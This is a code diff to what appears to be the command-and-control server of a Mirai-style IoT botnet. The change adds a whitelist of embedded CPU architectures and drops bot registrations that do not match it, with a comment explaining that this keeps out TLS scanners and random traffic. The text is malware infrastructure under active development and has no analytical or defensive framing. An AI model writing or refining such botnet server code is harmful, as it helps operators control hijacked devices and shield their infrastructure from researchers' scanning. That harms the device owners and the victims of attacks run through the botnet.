@@ -46,6 +46,14 @@ except (OSError, PermissionError):
     os.makedirs('/home/mirai', exist_ok=True)
     print(f"[!] /data not writable, falling back to {DB_PATH}")
 
+VALID_ARCHES = {
+    'arm', 'armv4l', 'armv5l', 'armv6l', 'armv7l', 'armv8l',
+    'mips', 'mipsel', 'mips64',
+    'i486', 'i586', 'i686', 'x86_64',
+    'sh4', 'sparc', 'powerpc', 'ppc', 'm68k',
+    'aarch64', 'riscv64',
+}
+
 # ——— database ——————————————————————————————————————————————————————
 db = sqlite3.connect(DB_PATH, check_same_thread=False)
 
@@ -138,6 +146,10 @@ def handle_bot(conn: socket.socket, addr):
         line = data.split(b'\n')[0].decode('utf-8', errors='ignore').strip()
         parts = line.split('|')
         arch   = parts[0] if len(parts) > 0 else 'unknown'
+        # reject garbage registrations (TLS scanners, random noise)
+        if arch not in VALID_ARCHES or not arch.isascii():
+            conn.close()
+            return
         bot_ip = addr[0]
         bot_id = hashlib.md5(f"{bot_ip}:{arch}:{time.time()}".encode()).hexdigest()[:16]
 
